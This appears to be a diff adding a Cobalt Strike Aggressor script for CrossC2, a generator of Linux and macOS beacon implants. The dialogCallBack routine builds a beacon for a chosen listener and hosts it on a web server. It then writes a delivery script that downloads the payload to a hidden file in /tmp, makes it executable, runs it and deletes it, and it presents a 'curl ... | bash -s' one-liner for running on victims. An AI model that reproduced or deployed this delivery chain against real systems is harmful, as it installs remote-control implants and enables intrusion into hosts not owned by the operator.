@@ -1,0 +1,142 @@
+menubar("CrossC2", "generator", 2);
+
+$CC2_PATH = "/xxx/xx/xx/"; # <-------- fix
+$CC2_BIN = "genCrossC2.MacOS";
+
+popup generator {
+    menu "&CrossC2 Payload Generator" {
+        item "&genCrossC2" {
+            genCrossC2()
+        }
+    }
+    item "&About" {
+        projectAbout()
+    }
+}
+
+sub random_string {
+    # <3 @offsec_ginger
+    $limit = $1;
+    @random_str = @();
+    $characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
+    for ($x = 0; $x < $limit; $x++) {
+        $n = rand(strlen($characters));
+        add(@random_str, charAt($characters, $n));
+    }
+    return join('', @random_str);
+}
+
+sub getSystemInfo {
+    $process = exec("/usr/bin/uname");
+    $data = readAll($process);
+    closef($process);
+    if (strlen($data) > 0) {
+        return 1;
+    } else {
+        return 0;
+    }
+}
+
+sub checkSpace {
+    $realPath = "";
+    if ($1 eq "null") {
+        $realPath = $1;
+    } else {
+        if (getSystemInfo() == 1) {
+            $realPath = replace($1, '\p{Space}', "\\\\ ");
+        } else {
+            $realPath = replace($1, '\p{Space}', "^ ");
+        }
+        if (find($realPath, '\p{Space}') > 0) {
+            $realPath = "'".$realPath."'";
+        }
+    }
+    return $realPath;
+}
+
+sub dialogCallBack {
+    elog("");
+    $system = $3['system'];
+    $arch = $3['arch'];
+    $payload_type = $3['payload_type'];
+    $listener = $3['listener'];
+    $outputFileName = $3['outputFileName'];
+    $beaconKeyPath = $3['beaconKey'];
+    $rebind_lib = $3['rebind_lib'];
+
+    $listener_info = listener_info($listener);
+    $host = $listener_info['host'];
+    $port = $listener_info['port'];
+
+    $outputFileName = checkSpace($outputFileName);
+    $rebind_lib = checkSpace($rebind_lib);
+    $beaconKeyPath = checkSpace($beaconKeyPath);
+
+    if ($payload_type eq "Staged") {
+        $outputFileName = $outputFileName." shellcode";
+    }
+
+
+    $genCC2 = $CC2_PATH . $CC2_BIN;  
+
+
+
+    $genCC2 = $genCC2." ".$host." ". $port." ".$beaconKeyPath." ".$rebind_lib." ".$system." ".$arch." ".$outputFileName;
+    elog($genCC2);
+    $process = exec($genCC2);
+    $data = readAll($process);
+    closef($process);
+    elog("genCrossC2 beacon -> ".$data[13]);
+
+    $handle = openf($outputFileName);
+    $c2Data = readb($handle, -1);
+    closef($handle);
+
+    $uri = $3['uri'];
+    $lport = $3['lport'];
+
+    $targetSaveName = random_string(10);
+
+    # host CrossC2 beacon
+    $payloadUrl = site_host($host, $lport, "/".$targetSaveName, $c2Data, "automatic", "CrossC2 beacon ".$system." ".$arch); 
+
+    $targetSaveName = '.'.$targetSaveName.'';
+
+    # host script
+    $script = "wget -U 'O' ".$payloadUrl." -O /tmp/".$targetSaveName." && chmod 777 /tmp/".$targetSaveName." && /tmp/".$targetSaveName." && sleep 7 && rm -f /tmp/".$targetSaveName;
+    $scriptUrl = site_host($host, $lport, $uri, $script, "automatic", "Script Unix Web Delivery (curl)");
+
+    # tell the user our URL
+    prompt_text("Copy/Paste One-liner: ", "curl -A o -o- -L " . $scriptUrl . " | bash -s", {});
+    elog("CrossC2 ".$system." ".$arch.":   curl -A o -o- -L " . $scriptUrl . " | bash -s");
+}
+
+sub genCrossC2 {
+    $dialog = dialog("CrossC2 Payload Generator", %(uri => "/a", lport => "55413", beaconKey => "./.cobaltstrike.beacon_keys", rebind_lib => "null", listener => "Listener: ", system => "System: ", arch => "Arch: ", payload_type => "Payload_Type: ", outputFileName => "/tmp/CrossC2-test"), &dialogCallBack);
+    dialog_description($dialog, "<style type=\"text/css\">.word{width: 100px;height: 30px;background: #E5E5E5;text-align: center;line-height: 30px;font-size: 14px;}</style><div class=\"word\">Export CrossC2 Payload<br><a href=\"https://github.com/gloxec/CrossC2\">https://github.com/gloxec/CrossC2</a></div>");
+    drow_text($dialog, "uri", "URI Path: ", 20);
+    drow_text($dialog, "lport", "Web Delivery Port: ", 20);
+    drow_file($dialog, "beaconKey", "Choose: default ./.cobaltstrike.beacon_keys");
+    drow_file($dialog, "rebind_lib", "Choose: rebind_dynamic_lib");
+    drow_combobox($dialog, "system", "System: ", @("Linux", "MacOS", "Linux-bind", "MacOS-bind"));
+    drow_listener($dialog, "listener", "Listener: (reverse_https)");
+    drow_combobox($dialog, "arch", "Arch: ", @("x64", "x86"));
+    drow_combobox($dialog, "payload_type", "Payload_Type: ", @("Stageless", "Staged"));
+    drow_text($dialog, "outputFileName", "OutputFileName: ");
+    dbutton_action($dialog, "Build");
+    dialog_show($dialog);
+}
+
+sub projectAboutCallback {
+    $autoupdate = "java -jar " . $CC2_PATH . "autoupdate.jar";
+    exec($autoupdate);
+}
+
+sub projectAbout {
+    $dialog = dialog("Cross C2 About",%(link => "https://github.com/gloxec/CrossC2"), &projectAboutCallback);
+    dialog_description($dialog, "Export CrossC2 Payload");
+    dbutton_action($dialog, "update");
+    drow_text($dialog, "link", "link: ", "");
+    dialog_show($dialog);
+}
+
